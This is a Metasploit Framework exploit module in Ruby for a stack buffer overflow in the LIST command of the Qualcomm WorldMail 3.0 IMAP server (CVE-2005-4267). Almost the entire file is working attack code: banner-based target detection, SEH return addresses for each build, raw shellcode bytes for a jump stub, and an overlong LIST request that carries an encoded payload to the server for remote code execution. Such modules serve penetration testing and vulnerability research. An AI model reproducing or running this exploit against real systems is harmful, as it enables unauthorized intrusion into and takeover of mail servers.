##
# $Id: eudora_list.rb 9653 2010-07-01 23:33:07Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Imap
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Qualcomm WorldMail 3.0 IMAPD LIST Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in the Qualcomm WorldMail IMAP Server
				version 3.0 (builds 6.1.19.0 through 6.1.22.0). Version 6.1.22.1 fixes this
				particular vulnerability.

				NOTE: The service does NOT restart automatically by default. You may be limited to
				only one attempt, so choose wisely!
			},
			'Author'         => [ 'MC', 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9653 $',
			'References'     =>
				[
					[ 'CVE', '2005-4267'],
					[ 'OSVDB', '22097'],
					[ 'BID', '15980'],

				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "\x00\x0a\x0d\x20\x7b",
					'StackAdustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
					[ 'WorldMail 3 Version 6.1.19.0',   { 'Ret' => 0x600b6317 } ], # p/p/r in MLstMgr.dll v6.1.19.0
					[ 'WorldMail 3 Version 6.1.20.0',   { 'Ret' => 0x10022187 } ], # p/p/r in msremote.dll ?
					[ 'WorldMail 3 Version 6.1.22.0',   { 'Ret' => 0x10022187 } ], # p/p/r in MsRemote.dll v6.1.22.0
				],
			'DisclosureDate' => 'Dec 20 2005',
			'DefaultTarget' => 0))
	end

	def check
		targ = auto_target
		disconnect

		return Exploit::CheckCode::Vulnerable if (targ)
		return Exploit::CheckCode::Safe
	end

	def auto_target
		connect

		if (banner and banner =~ /WorldMail/ and banner =~ /IMAP4 Server (.*) ready/)
			version = $1
			ver = version.split('.')
			if (ver.length == 4)
				major = ver[0].to_i
				minor = ver[1].to_i
				rev = ver[2].to_i
				build = ver[3].to_i
				if (major == 6 and minor == 1)
					return targets[1] if (rev == 19)
					return targets[2] if (rev == 20)
					return targets[3] if (rev == 22)
				end
			end
		end

		# no target found
		nil
	end

	def exploit
		if (target_index == 0)
			mytarget = auto_target
			if mytarget
				print_status("Automatically detected \"#{mytarget.name}\" ...")
			else
				raise RuntimeError, 'Unable to automatically detect a target'
			end
		else
			mytarget = target
			connect
		end

		jmp =  "\x6a\x05\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x2f\x77\x28"
		jmp << "\x4b\x83\xeb\xfc\xe2\xf4\xf6\x99\xf1\x3f\x0b\x83\x71\xcb\xee\x7d"
		jmp << "\xb8\xb5\xe2\x89\xe5\xb5\xe2\x88\xc9\x4b"

		sploit =  "a001 LIST " + rand_text_alphanumeric(20)
		sploit << payload.encoded
		sploit << generate_seh_record(mytarget.ret)
		sploit << make_nops(8) + jmp + rand_text_alphanumeric(40)
		sploit << "}" + "\r\n"

		sock.put(sploit)

		handler
		disconnect
	end

end
